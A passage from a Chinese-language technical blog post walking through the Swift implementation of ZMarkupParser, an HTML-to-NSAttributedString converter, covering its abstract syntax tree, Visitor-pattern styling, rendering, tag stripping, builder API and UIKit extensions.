HTMLParsedResult.close($0.convertToCloseParsedItem()) }) normalizationResult.insert(contentsOf: afterItems, at: newItems.index(after: itemIndex)) normalizationResult.insert(contentsOf: beforeItems, at: itemIndex) itemIndex = newItems.index(after: itemIndex) + stackExpectedStartItemsOccurred.count // 更新 Start Stack Tags // e.g. -&gt; b,u stackExpectedStartItems.removeAll { startItem in return reversedStackExpectedStartItems.prefix(through: reversedStackExpectedStartItemsOccurredIndex).contains(where: { $0 === startItem }) } case .selfClosing, .rawString: itemIndex += 1 }}print(normalizationResult)// [// .start(\"a\",[\"href\":\"https://zhgchg.li\"])// .rawString(\"Li\")// .start(\"b\",nil)// .rawString(\"nk\")// .close(\"b\")// .close(\"a\")// .start(\"b\",nil)// .rawString(\"Bold\")// .close(\"b\")// ] 對應原始碼中的 HTMLParsedResultFormatterProcessor.swift 實作Abstract Syntax Tree a.k.a AST, 抽象樹經過 Tokenization &amp; Normalization 資料預處理完成後，再來要將結果轉換成抽象樹🌲。如上圖轉換成抽象樹可以方便我們日後的操作及擴充，例如實現 Selector 功能或是做其他轉換，例如 HTML To Markdown；亦或是日後想增加 Markdown to NSAttributedString，只需實現 Markdown 的 Tokenization &amp; Normalization 就能完成。首先我們定義一個 Markup Protocol，有 Child &amp; Parent 屬性，紀錄葉子跟樹枝的資訊:protocol Markup: AnyObject { var parentMarkup: Markup? { get set } var childMarkups: [Markup] { get set } func appendChild(markup: Markup) func prependChild(markup: Markup) func accept&lt;V: MarkupVisitor&gt;(_ visitor: V) -&gt; V.Result}extension Markup { func appendChild(markup: Markup) { markup.parentMarkup = self childMarkups.append(markup) } func prependChild(markup: Markup) { markup.parentMarkup = self childMarkups.insert(markup, at: 0) }}另外搭配使用 Visitor Pattern ，將每種樣式屬性都定義成一個物件 Element，再透過不同的 Visit 策略取得個別的套用結果。protocol MarkupVisitor { associatedtype Result func visit(markup: Markup) -&gt; Result func visit(_ markup: RootMarkup) -&gt; Result func visit(_ markup: RawStringMarkup) -&gt; Result func visit(_ markup: BoldMarkup) -&gt; Result func visit(_ markup: LinkMarkup) -&gt; Result //...}extension MarkupVisitor { func visit(markup: Markup) -&gt; Result { return markup.accept(self) }}基本 Markup 節點：// 根節點final class RootMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}// 葉節點final class RawStringMarkup: Markup { let attributedString: NSAttributedString init(attributedString: NSAttributedString) { self.attributedString = attributedString } weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}定義 Markup 樣式節點：// 樹枝節點:// 連結樣式final class LinkMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}// 粗體樣式final class BoldMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }} 對應原始碼中的 Markup 實作轉換成抽象樹之前我們還需要…MarkupComponent因為我們的樹結構不與任何資料結構有依賴(例如 a 節點/LinkMarkup，應該要有 url 資訊才能做後續 Render)。 對此我們另外定義一個容器存放樹節點與節點相關的資料資訊:protocol MarkupComponent { associatedtype T var markup: Markup { get } var value: T { get } init(markup: Markup, value: T)}extension Sequence where Iterator.Element: MarkupComponent { func value(markup: Markup) -&gt; Element.T? { return self.first(where:{ $0.markup === markup })?.value as? Element.T }} 對應原始碼中的 MarkupComponent 實作也可將 Markup 宣告 Hashable ，直接使用 Dictionary 存放值 [Markup: Any] ，但是這樣 Markup 就不能被當一般 type 使用，要加上 any Markup 。HTMLTag &amp; HTMLTagName &amp; HTMLTagNameVisitorHTML Tag Name 部分我們也做了一層的抽象，讓使用者能自行決定有哪些 Tag 需要被處理，也能方便日後的擴充，例如: &lt;strong&gt; Tag Name 同樣可對應到 BoldMarkup 。public protocol HTMLTagName { var string: String { get } func accept&lt;V: HTMLTagNameVisitor&gt;(_ visitor: V) -&gt; V.Result}public struct A_HTMLTagName: HTMLTagName { public let string: String = WC3HTMLTagName.a.rawValue public init() { } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagNameVisitor { return visitor.visit(self) }}public struct B_HTMLTagName: HTMLTagName { public let string: String = WC3HTMLTagName.b.rawValue public init() { } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagNameVisitor { return visitor.visit(self) }} 對應原始碼中的 HTMLTagNameVisitor 實作 另外參考 W3C wiki 列舉了 HTML tag name enum: WC3HTMLTagName.swiftHTMLTag 則是單純一個容器物件，因為我們希望能讓外部指定 HTML Tag 對應到的樣式，所以宣告一個容器放在一起:struct HTMLTag { let tagName: HTMLTagName let customStyle: MarkupStyle? // 後面介紹 Render 會解釋 init(tagName: HTMLTagName, customStyle: MarkupStyle? = nil) { self.tagName = tagName self.customStyle = customStyle }} 對應原始碼中的 HTMLTag 實作HTMLTagNameToHTMLMarkupVisitorstruct HTMLTagNameToMarkupVisitor: HTMLTagNameVisitor { typealias Result = Markup let attributes: [String: String]? func visit(_ tagName: A_HTMLTagName) -&gt; Result { return LinkMarkup() } func visit(_ tagName: B_HTMLTagName) -&gt; Result { return BoldMarkup() } //...} 對應原始碼中的 HTMLTagNameToHTMLMarkupVisitor 實作轉換成抽象樹 with HTML 資料我們要將 Normalization 後的 HTML 資料結果轉換成抽象樹，首先宣告一個能存放 HTML 資料的 MarkupComponent 資料結構:struct HTMLElementMarkupComponent: MarkupComponent { struct HTMLElement { let tag: HTMLTag let tagAttributedString: NSAttributedString let attributes: [String: String]? } typealias T = HTMLElement let markup: Markup let value: HTMLElement init(markup: Markup, value: HTMLElement) { self.markup = markup self.value = value }}轉換成 Markup 抽象樹:var htmlElementComponents: [HTMLElementMarkupComponent] = []let rootMarkup = RootMarkup()var currentMarkup: Markup = rootMarkuplet htmlTags: [String: HTMLTag]init(htmlTags: [HTMLTag]) { self.htmlTags = Dictionary(uniqueKeysWithValues: htmlTags.map{ ($0.tagName.string, $0) })}// Start Tags Stack, 確保有正確 pop tag// 前面已經做過 Normalization 了, 應該不會出錯, 只是確保而已var stackExpectedStartItems: [HTMLParsedResult.StartItem] = []for thisItem in from { switch thisItem { case .start(let item): let visitor = HTMLTagNameToMarkupVisitor(attributes: item.attributes) let htmlTag = self.htmlTags[item.tagName] ?? HTMLTag(tagName: ExtendTagName(item.tagName)) // 用 Visitor 問對應的 Markup let markup = visitor.visit(tagName: htmlTag.tagName) // 把自己加入當前枝的葉節點 // 自己變成當前枝節點 htmlElementComponents.append(.init(markup: markup, value: .init(tag: htmlTag, tagAttributedString: item.tagAttributedString, attributes: item.attributes))) currentMarkup.appendChild(markup: markup) currentMarkup = markup stackExpectedStartItems.append(item) case .selfClosing(let item): // 直接加入當前枝的葉節點 let visitor = HTMLTagNameToMarkupVisitor(attributes: item.attributes) let htmlTag = self.htmlTags[item.tagName] ?? HTMLTag(tagName: ExtendTagName(item.tagName)) let markup = visitor.visit(tagName: htmlTag.tagName) htmlElementComponents.append(.init(markup: markup, value: .init(tag: htmlTag, tagAttributedString: item.tagAttributedString, attributes: item.attributes))) currentMarkup.appendChild(markup: markup) case .close(let item): if let lastTagName = stackExpectedStartItems.popLast()?.tagName, lastTagName == item.tagName { // 遇到 Close Tag, 就回到上一層 currentMarkup = currentMarkup.parentMarkup ?? currentMarkup } case .rawString(let attributedString): // 直接加入當前枝的葉節點 currentMarkup.appendChild(markup: RawStringMarkup(attributedString: attributedString)) }}// print(htmlElementComponents)// [(markup: LinkMarkup, (tag: a, attributes: [\"href\":\"zhgchg.li\"]...)]運作結果如上圖 對應原始碼中的 HTMLParsedResultToHTMLElementWithRootMarkupProcessor.swift 實作此時，其實我們就完成 Selector 的功能了 🎉public class HTMLSelector: CustomStringConvertible { let markup: Markup let componets: [HTMLElementMarkupComponent] init(markup: Markup, componets: [HTMLElementMarkupComponent]) { self.markup = markup self.componets = componets } public func filter(_ htmlTagName: String) -&gt; [HTMLSelector] { let result = markup.childMarkups.filter({ componets.value(markup: $0)?.tag.tagName.isEqualTo(htmlTagName) ?? false }) return result.map({ .init(markup: $0, componets: componets) }) } //...}我們可以一層一層 Filter 葉節點物件。 對應原始碼中的 HTMLSelector 實作Parser — HTML to MarkupSyle (Abstract of NSAttributedString.Key)再來我們要先完成將 HTML 轉換成 MarkupStyle (NSAttributedString.Key)。NSAttributedString 是透過 NSAttributedString.Key Attributes 來設定字的樣式，我們抽象出 NSAttributedString.Key 的所有欄位對應到 MarkupStyle,MarkupStyleColor,MarkupStyleFont,MarkupStyleParagraphStyle。目的： 原本的 Attributes 的資料結構是 [NSAttributedString.Key: Any?] ，如果直接暴露出去，我們很難控制使用者帶入的值，如果帶錯還會造成閃退，例如 .font: 123 樣式需要可繼承，例如 &lt;a&gt;&lt;b&gt;test&lt;/b&gt;&lt;/a&gt; ，test 字串的樣式就是繼承自 link 的 bold (bold+linke)；如果直接暴露 Dictionary 出去很難控制好繼承規 封裝 iOS/macOS (UIKit/Appkit) 所屬物件MarkupStyle Structpublic struct MarkupStyle { public var font:MarkupStyleFont public var paragraphStyle:MarkupStyleParagraphStyle public var foregroundColor:MarkupStyleColor? = nil public var backgroundColor:MarkupStyleColor? = nil public var ligature:NSNumber? = nil public var kern:NSNumber? = nil public var tracking:NSNumber? = nil public var strikethroughStyle:NSUnderlineStyle? = nil public var underlineStyle:NSUnderlineStyle? = nil public var strokeColor:MarkupStyleColor? = nil public var strokeWidth:NSNumber? = nil public var shadow:NSShadow? = nil public var textEffect:String? = nil public var attachment:NSTextAttachment? = nil public var link:URL? = nil public var baselineOffset:NSNumber? = nil public var underlineColor:MarkupStyleColor? = nil public var strikethroughColor:MarkupStyleColor? = nil public var obliqueness:NSNumber? = nil public var expansion:NSNumber? = nil public var writingDirection:NSNumber? = nil public var verticalGlyphForm:NSNumber? = nil //... // 繼承自... // 預設: 欄位為 nil 時，從 from 填入當前資料物件 mutating func fillIfNil(from: MarkupStyle?) { guard let from = from else { return } var currentFont = self.font currentFont.fillIfNil(from: from.font) self.font = currentFont var currentParagraphStyle = self.paragraphStyle currentParagraphStyle.fillIfNil(from: from.paragraphStyle) self.paragraphStyle = currentParagraphStyle //.. } // MarkupStyle to NSAttributedString.Key: Any func render() -&gt; [NSAttributedString.Key: Any] { var data: [NSAttributedString.Key: Any] = [:] if let font = font.getFont() { data[.font] = font } if let ligature = self.ligature { data[.ligature] = ligature } //... return data }}public struct MarkupStyleFont: MarkupStyleItem { public enum FontWeight { case style(FontWeightStyle) case rawValue(CGFloat) } public enum FontWeightStyle: String { case ultraLight, light, thin, regular, medium, semibold, bold, heavy, black // ... } public var size: CGFloat? public var weight: FontWeight? public var italic: Bool? //...}public struct MarkupStyleParagraphStyle: MarkupStyleItem { public var lineSpacing:CGFloat? = nil public var paragraphSpacing:CGFloat? = nil public var alignment:NSTextAlignment? = nil public var headIndent:CGFloat? = nil public var tailIndent:CGFloat? = nil public var firstLineHeadIndent:CGFloat? = nil public var minimumLineHeight:CGFloat? = nil public var maximumLineHeight:CGFloat? = nil public var lineBreakMode:NSLineBreakMode? = nil public var baseWritingDirection:NSWritingDirection? = nil public var lineHeightMultiple:CGFloat? = nil public var paragraphSpacingBefore:CGFloat? = nil public var hyphenationFactor:Float? = nil public var usesDefaultHyphenation:Bool? = nil public var tabStops: [NSTextTab]? = nil public var defaultTabInterval:CGFloat? = nil public var textLists: [NSTextList]? = nil public var allowsDefaultTighteningForTruncation:Bool? = nil public var lineBreakStrategy: NSParagraphStyle.LineBreakStrategy? = nil //...}public struct MarkupStyleColor { let red: Int let green: Int let blue: Int let alpha: CGFloat //...} 對應原始碼中的 MarkupStyle 實作 另外也參考 W3c wiki, browser predefined color name 列舉了對應 color name text &amp; color R,G,B enum: MarkupStyleColorName.swiftHTMLTagStyleAttribute &amp; HTMLTagStyleAttributeVisitor這邊多提一下這兩個物件，因為 HTML Tag 是允許搭配從 CSS 設定樣式的；對此我們同 HTMLTagName 的抽象，再套用一次在 HTML Style Attribute 上。例如 HTML 可能會給： &lt;a style=”color:red;font-size:14px”&gt;RedLink&lt;/a&gt; ，代表這個連結要設定成紅色、大小 14px。public protocol HTMLTagStyleAttribute { var styleName: String { get } func accept&lt;V: HTMLTagStyleAttributeVisitor&gt;(_ visitor: V) -&gt; V.Result}public protocol HTMLTagStyleAttributeVisitor { associatedtype Result func visit(styleAttribute: HTMLTagStyleAttribute) -&gt; Result func visit(_ styleAttribute: ColorHTMLTagStyleAttribute) -&gt; Result func visit(_ styleAttribute: FontSizeHTMLTagStyleAttribute) -&gt; Result //...}public extension HTMLTagStyleAttributeVisitor { func visit(styleAttribute: HTMLTagStyleAttribute) -&gt; Result { return styleAttribute.accept(self) }} 對應原始碼中的 HTMLTagStyleAttribute 實作HTMLTagStyleAttributeToMarkupStyleVisitorstruct HTMLTagStyleAttributeToMarkupStyleVisitor: HTMLTagStyleAttributeVisitor { typealias Result = MarkupStyle? let value: String func visit(_ styleAttribute: ColorHTMLTagStyleAttribute) -&gt; Result { // 正則挖取 Color Hex or Mapping from HTML Pre-defined Color Name, 請參考 Source Code guard let color = MarkupStyleColor(string: value) else { return nil } return MarkupStyle(foregroundColor: color) } func visit(_ styleAttribute: FontSizeHTMLTagStyleAttribute) -&gt; Result { // 正則挖取 10px -&gt; 10, 請參考 Source Code guard let size = self.convert(fromPX: value) else { return nil } return MarkupStyle(font: MarkupStyleFont(size: CGFloat(size))) } // ...} 對應原始碼中的 HTMLTagAttributeToMarkupStyleVisitor.swift 實作init 的 value = attribute 的值，依照 visit 類型轉換到對應 MarkupStyle 欄位。HTMLElementMarkupComponentMarkupStyleVisitor介紹完 MarkupStyle 物件後，我們要從 Normalization 的 HTMLElementComponents 結果轉換成 MarkupStyle。// MarkupStyle 策略public enum MarkupStylePolicy { case respectMarkupStyleFromCode // 從 Code 來的為主, 用 HTML Style Attribute 來的填空 case respectMarkupStyleFromHTMLStyleAttribute // 從 HTML Style Attribute 來的為主, 用 Code 來的填空}struct HTMLElementMarkupComponentMarkupStyleVisitor: MarkupVisitor { typealias Result = MarkupStyle? let policy: MarkupStylePolicy let components: [HTMLElementMarkupComponent] let styleAttributes: [HTMLTagStyleAttribute] func visit(_ markup: BoldMarkup) -&gt; Result { // .bold 只是定義在 MarkupStyle 中的預設樣式, 請參考 Source Code return defaultVisit(components.value(markup: markup), defaultStyle: .bold) } func visit(_ markup: LinkMarkup) -&gt; Result { // .link 只是定義在 MarkupStyle 中的預設樣式, 請參考 Source Code var markupStyle = defaultVisit(components.value(markup: markup), defaultStyle: .link) ?? .link // 從 HtmlElementComponents 取得 LinkMarkup 對應的 HtmlElement // 從 HtmlElement 中的 attributes 找 href 參數 (HTML 帶 URL String 的方式) if let href = components.value(markup: markup)?.attributes?[\"href\"] as? String, let url = URL(string: href) { markupStyle.link = url } return markupStyle } // ...}extension HTMLElementMarkupComponentMarkupStyleVisitor { // 取得 HTMLTag 容器中指定想客製化的 MarkupStyle private func customStyle(_ htmlElement: HTMLElementMarkupComponent.HTMLElement?) -&gt; MarkupStyle? { guard let customStyle = htmlElement?.tag.customStyle else { return nil } return customStyle } // 預設動作 func defaultVisit(_ htmlElement: HTMLElementMarkupComponent.HTMLElement?, defaultStyle: MarkupStyle? = nil) -&gt; Result { var markupStyle: MarkupStyle? = customStyle(htmlElement) ?? defaultStyle // 從 HtmlElementComponents 取得 LinkMarkup 對應的 HtmlElement // 看看 HtmlElement 中的 attributes 有沒有 `Style` Attribute guard let styleString = htmlElement?.attributes?[\"style\"], styleAttributes.count &gt; 0 else { // 沒有 return markupStyle } // 有 Style Attributes // 切割 Style Value 字串成陣列 // font-size:14px;color:red -&gt; [\"font-size\":\"14px\",\"color\":\"red\"] let styles = styleString.split(separator: \";\").filter { $0.trimmingCharacters(in: .whitespacesAndNewlines) != \"\" }.map { $0.split(separator: \":\") } for style in styles { guard style.count == 2 else { continue } // e.g font-szie let key = style[0].trimmingCharacters(in: .whitespacesAndNewlines) // e.g. 14px let value = style[1].trimmingCharacters(in: .whitespacesAndNewlines) if let styleAttribute = styleAttributes.first(where: { $0.isEqualTo(styleName: key) }) { // 使用上文中的 HTMLTagStyleAttributeToMarkupStyleVisitor 換回 MarkupStyle let visitor = HTMLTagStyleAttributeToMarkupStyleVisitor(value: value) if var thisMarkupStyle = visitor.visit(styleAttribute: styleAttribute) { // Style Attribute 有換回值時.. // 合併上一個 MarkupStyle 結果 thisMarkupStyle.fillIfNil(from: markupStyle) markupStyle = thisMarkupStyle } } } // 如果有預設 Style if var defaultStyle = defaultStyle { switch policy { case .respectMarkupStyleFromHTMLStyleAttribute: // Style Attribute MarkupStyle 為主，然後 // 合併 defaultStyle 結果 markupStyle?.fillIfNil(from: defaultStyle) case .respectMarkupStyleFromCode: // defaultStyle 為主，然後 // 合併 Style Attribute MarkupStyle 結果 defaultStyle.fillIfNil(from: markupStyle) markupStyle = defaultStyle } } return markupStyle }} 對應原始碼中的 HTMLTagAttributeToMarkupStyleVisitor.swift 實作我們會定義部分預設樣式在 MarkupStyle 中，部分 Markup 如果沒有從 Code 外部指定 Tag 想要的樣式時會使用預設樣式。樣式繼承策略有兩種： respectMarkupStyleFromCode:使用預設樣式為主；再看 Style Attributes 中能補上什麼樣式，如果本來就有值則忽略。 respectMarkupStyleFromHTMLStyleAttribute:看 Style Attributes 為主；再看 預設樣式 中能補上什麼樣式，如果本來就有值則忽略。HTMLElementWithMarkupToMarkupStyleProcessor將 Normalization 結果轉換成 AST &amp; MarkupStyleComponent。新宣告一個 MarkupComponent 這次要存放對應 MarkupStyle:struct MarkupStyleComponent: MarkupComponent { typealias T = MarkupStyle let markup: Markup let value: MarkupStyle init(markup: Markup, value: MarkupStyle) { self.markup = markup self.value = value }}簡單遍歷個 Markup Tree &amp; HTMLElementMarkupComponent 結構:let styleAttributes: [HTMLTagStyleAttribute]let policy: MarkupStylePolicy func process(from: (Markup, [HTMLElementMarkupComponent])) -&gt; [MarkupStyleComponent] { var components: [MarkupStyleComponent] = [] let visitor = HTMLElementMarkupComponentMarkupStyleVisitor(policy: policy, components: from.1, styleAttributes: styleAttributes) walk(markup: from.0, visitor: visitor, components: &amp;components) return components} func walk(markup: Markup, visitor: HTMLElementMarkupComponentMarkupStyleVisitor, components: inout [MarkupStyleComponent]) { if let markupStyle = visitor.visit(markup: markup) { components.append(.init(markup: markup, value: markupStyle)) } for markup in markup.childMarkups { walk(markup: markup, visitor: visitor, components: &amp;components) }}// print(components)// [(markup: LinkMarkup, MarkupStyle(link: https://zhgchg.li, color: .blue)]// [(markup: BoldMarkup, MarkupStyle(font: .init(weight: .bold))] 對應原始碼中的 HTMLElementWithMarkupToMarkupStyleProcessor.swift 實作流程結果如上圖Render — Convert To NSAttributedString現在我們有了 HTML Tag 抽象樹結構、HTML Tag 對應的 MarkupStyle 後；最後一步我們就能來產出最後的 NSAttributedString 渲染結果。MarkupNSAttributedStringVisitorvisit markup to NSAttributedStringstruct MarkupNSAttributedStringVisitor: MarkupVisitor { typealias Result = NSAttributedString let components: [MarkupStyleComponent] // root / base 的 MarkupStyle, 外部指定，例如可指定整串字的大小 let rootStyle: MarkupStyle? func visit(_ markup: RootMarkup) -&gt; Result { // 往下看 RawString 物件 return collectAttributedString(markup) } func visit(_ markup: RawStringMarkup) -&gt; Result { // 回傳 Raw String // 搜集鏈上的所有 MarkupStyle // 套用 Style 到 NSAttributedString return applyMarkupStyle(markup.attributedString, with: collectMarkupStyle(markup)) } func visit(_ markup: BoldMarkup) -&gt; Result { // 往下看 RawString 物件 return collectAttributedString(markup) } func visit(_ markup: LinkMarkup) -&gt; Result { // 往下看 RawString 物件 return collectAttributedString(markup) } // ...}private extension MarkupNSAttributedStringVisitor { // 套用 Style 到 NSAttributedString func applyMarkupStyle(_ attributedString: NSAttributedString, with markupStyle: MarkupStyle?) -&gt; NSAttributedString { guard let markupStyle = markupStyle else { return attributedString } let mutableAttributedString = NSMutableAttributedString(attributedString: attributedString) mutableAttributedString.addAttributes(markupStyle.render(), range: NSMakeRange(0, mutableAttributedString.string.utf16.count)) return mutableAttributedString } func collectAttributedString(_ markup: Markup) -&gt; NSMutableAttributedString { // collect from downstream // Root -&gt; Bold -&gt; String(\"Bold\") // \\ // &gt; String(\"Test\") // Result: Bold Test // 一層一層往下找 raw string, 遞迴 visit 並組合出最終 NSAttributedString return markup.childMarkups.compactMap({ visit(markup: $0) }).reduce(NSMutableAttributedString()) { partialResult, attributedString in partialResult.append(attributedString) return partialResult } } func collectMarkupStyle(_ markup: Markup) -&gt; MarkupStyle? { // collect from upstream // String(\"Test\") -&gt; Bold -&gt; Italic -&gt; Root // Result: style: Bold+Italic // 一層一層網上找 parent tag 的 markupstyle // 然後一層一層繼承樣式 var currentMarkup: Markup? = markup.parentMarkup var currentStyle = components.value(markup: markup) while let thisMarkup = currentMarkup { guard let thisMarkupStyle = components.value(markup: thisMarkup) else { currentMarkup = thisMarkup.parentMarkup continue } if var thisCurrentStyle = currentStyle { thisCurrentStyle.fillIfNil(from: thisMarkupStyle) currentStyle = thisCurrentStyle } else { currentStyle = thisMarkupStyle } currentMarkup = thisMarkup.parentMarkup } if var currentStyle = currentStyle { currentStyle.fillIfNil(from: rootStyle) return currentStyle } else { return rootStyle } }} 對應原始碼中的 MarkupNSAttributedStringVisitor.swift 實作運作流程及結果如上圖最終我們可以得到:Li{ NSColor = \"Blue\"; NSFont = \"&lt;UICTFont: 0x145d17600&gt; font-family: \\\".SFUI-Regular\\\"; font-weight: normal; font-style: normal; font-size: 13.00pt\"; NSLink = \"https://zhgchg.li\";}nk{ NSColor = \"Blue\"; NSFont = \"&lt;UICTFont: 0x145d18710&gt; font-family: \\\".SFUI-Semibold\\\"; font-weight: bold; font-style: normal; font-size: 13.00pt\"; NSLink = \"https://zhgchg.li\";}Bold{ NSFont = \"&lt;UICTFont: 0x145d18710&gt; font-family: \\\".SFUI-Semibold\\\"; font-weight: bold; font-style: normal; font-size: 13.00pt\";} 🎉🎉🎉🎉完成🎉🎉🎉🎉到此我們就完成了 HTML String to NSAttributedString 的整個轉換過程。Stripper — 剝離 HTML Tag剝離 HTML Tag 的部分相對簡單，只需要:func attributedString(_ markup: Markup) -&gt; NSAttributedString { if let rawStringMarkup = markup as? RawStringMarkup { return rawStringMarkup.attributedString } else { return markup.childMarkups.compactMap({ attributedString($0) }).reduce(NSMutableAttributedString()) { partialResult, attributedString in partialResult.append(attributedString) return partialResult } }} 對應原始碼中的 MarkupStripperProcessor.swift 實作類似 Render，但純粹找到 RawStringMarkup 後返回內容。Extend — 動態擴充為了能擴充涵蓋所有 HTMLTag/Style Attribute 所以開了一個動態擴充的口，方便直接從 Code 動態擴充物件。public struct ExtendTagName: HTMLTagName { public let string: String public init(_ w3cHTMLTagName: WC3HTMLTagName) { self.string = w3cHTMLTagName.rawValue } public init(_ string: String) { self.string = string.trimmingCharacters(in: .whitespacesAndNewlines).lowercased() } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagNameVisitor { return visitor.visit(self) }}// tofinal class ExtendMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}//----public struct ExtendHTMLTagStyleAttribute: HTMLTagStyleAttribute { public let styleName: String public let render: ((String) -&gt; (MarkupStyle?)) // 動態用 clourse 變更 MarkupStyle public init(styleName: String, render: @escaping ((String) -&gt; (MarkupStyle?))) { self.styleName = styleName self.render = render } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagStyleAttributeVisitor { return visitor.visit(self) }}ZHTMLParserBuilder最後我們使用 Builder Pattern 讓外部 Module 可以快速構建 ZMarkupParser 所需的物件，並做好 Access Level Control。public final class ZHTMLParserBuilder { private(set) var htmlTags: [HTMLTag] = [] private(set) var styleAttributes: [HTMLTagStyleAttribute] = [] private(set) var rootStyle: MarkupStyle? private(set) var policy: MarkupStylePolicy = .respectMarkupStyleFromCode public init() { } public static func initWithDefault() -&gt; Self { var builder = Self.init() for htmlTagName in ZHTMLParserBuilder.htmlTagNames { builder = builder.add(htmlTagName) } for styleAttribute in ZHTMLParserBuilder.styleAttributes { builder = builder.add(styleAttribute) } return builder } public func set(_ htmlTagName: HTMLTagName, withCustomStyle markupStyle: MarkupStyle?) -&gt; Self { return self.add(htmlTagName, withCustomStyle: markupStyle) } public func add(_ htmlTagName: HTMLTagName, withCustomStyle markupStyle: MarkupStyle? = nil) -&gt; Self { // 同個 tagName 只能存在一個 htmlTags.removeAll { htmlTag in return htmlTag.tagName.string == htmlTagName.string } htmlTags.append(HTMLTag(tagName: htmlTagName, customStyle: markupStyle)) return self } public func add(_ styleAttribute: HTMLTagStyleAttribute) -&gt; Self { styleAttributes.removeAll { thisStyleAttribute in return thisStyleAttribute.styleName == styleAttribute.styleName } styleAttributes.append(styleAttribute) return self } public func set(rootStyle: MarkupStyle) -&gt; Self { self.rootStyle = rootStyle return self } public func set(policy: MarkupStylePolicy) -&gt; Self { self.policy = policy return self } public func build() -&gt; ZHTMLParser { // ZHTMLParser init 只開放 internal, 外部無法直接 init // 只能透過 ZHTMLParserBuilder init return ZHTMLParser(htmlTags: htmlTags, styleAttributes: styleAttributes, policy: policy, rootStyle: rootStyle) }} 對應原始碼中的 ZHTMLParserBuilder.swift 實作initWithDefault 預設會加入所有已經實現的 HTMLTagName/Style Attributepublic extension ZHTMLParserBuilder { static var htmlTagNames: [HTMLTagName] { return [ A_HTMLTagName(), B_HTMLTagName(), BR_HTMLTagName(), DIV_HTMLTagName(), HR_HTMLTagName(), I_HTMLTagName(), LI_HTMLTagName(), OL_HTMLTagName(), P_HTMLTagName(), SPAN_HTMLTagName(), STRONG_HTMLTagName(), U_HTMLTagName(), UL_HTMLTagName(), DEL_HTMLTagName(), TR_HTMLTagName(), TD_HTMLTagName(), TH_HTMLTagName(), TABLE_HTMLTagName(), IMG_HTMLTagName(handler: nil), // ... ] }}public extension ZHTMLParserBuilder { static var styleAttributes: [HTMLTagStyleAttribute] { return [ ColorHTMLTagStyleAttribute(), BackgroundColorHTMLTagStyleAttribute(), FontSizeHTMLTagStyleAttribute(), FontWeightHTMLTagStyleAttribute(), LineHeightHTMLTagStyleAttribute(), WordSpacingHTMLTagStyleAttribute(), // ... ] }}ZHTMLParser init 只開放 internal，外部無法直接 init，只能透過 ZHTMLParserBuilder init。ZHTMLParser 封裝了 Render/Selector/Stripper 操作:public final class ZHTMLParser: ZMarkupParser { let htmlTags: [HTMLTag] let styleAttributes: [HTMLTagStyleAttribute] let rootStyle: MarkupStyle? internal init(...) { } // 取得 link style attributes public var linkTextAttributes: [NSAttributedString.Key: Any] { // ... } public func selector(_ string: String) -&gt; HTMLSelector { // ... } public func selector(_ attributedString: NSAttributedString) -&gt; HTMLSelector { // ... } public func render(_ string: String) -&gt; NSAttributedString { // ... } // 允許使用 HTMLSelector 結果渲染出節點內的 NSAttributedString public func render(_ selector: HTMLSelector) -&gt; NSAttributedString { // ... } public func render(_ attributedString: NSAttributedString) -&gt; NSAttributedString { // ... } public func stripper(_ string: String) -&gt; String { // ... } public func stripper(_ attributedString: NSAttributedString) -&gt; NSAttributedString { // ... } // ...} 對應原始碼中的 ZHTMLParser.swift 實作UIKit 問題NSAttributedString 的結果我們最常的就是放到 UITextView 中顯示，但是要注意: UITextView 裡的連結樣式是統一看 linkTextAttributes 設定連結樣式，不會看 NSAttributedString.Key 的設定，且無法個別設定樣式；因此才會有 ZMarkupParser.linkTextAttributes 這個開口。 UILabel 暫時沒有方式改變連結樣式，且因 UILabel 沒有 TextStroage，若要拿來載入 NSTextAttachment 圖片；需要另外抓住 UILabel。public extension UITextView { func setHtmlString(_ string: String, with parser: ZHTMLParser) { self.setHtmlString(NSAttributedString(string: string), with: parser) } func setHtmlString(_ string: NSAttributedString, with parser: ZHTMLParser) { self.attributedText = parser.render(string) self.linkTextAttributes = parser.linkTextAttributes }}public extension UILabel { func setHtmlString(_ string: String, with parser: ZHTMLParser) { self.setHtmlString(NSAttributedString(string: string), with: parser) } func setHtmlString(_ string: NSAttributedString, with parser: ZHTMLParser) { let attributedString = parser.render(string) attributedString.enumerateAttribute(NSAttributedString.Key.attachment, in: NSMakeRange(0, attributedString.string.utf16.count), options: []) { (value, effectiveRange, nil) in guard let attachment = value as? ZNSTextAttachment else { return } attachment.register(self) } self.attributedText = attributedString }}因此多 Extension 了 UIKit，外部只需無腦 setHTMLString() 即可完成綁定。複雜的渲染項目— 項目清單關於項目清單的實現紀錄。在 HTML 中使用 &lt;ol&gt; / &lt;ul&gt; 包裝 &lt;li&gt; 表示項目清單:&lt;ul&gt; &lt;li&gt;ItemA&lt;/li&gt; &lt;li&gt;ItemB&lt;/li&gt; &lt;li&gt;ItemC&lt;/li&gt; //...&lt;/ul&gt;使用同前文解析方式，我們可以在 visit(_ markup: ListItemMarkup) 取得其他 list item 知道當前 list index (得利於有轉換成 AST)。func visit(_ markup: ListItemMarkup) -&gt; Result { let siblingListItems = markup.parentMarkup?.childMarkups.filter({ $0 is ListItemMarkup }) ?? [] let position = (siblingListItems.firstIndex(where: { $0 === markup }) ?? 0)}NSParagraphStyle 有一個 NSTextList 物件可以用來顯示 list item，但是在實作上無法客製化空白的寬度 (個人覺得空白太大)，如果項目符號與字串中間有空白會讓換行觸發在此，顯示會有點奇怪，如下圖:Beter 部分有機會透過 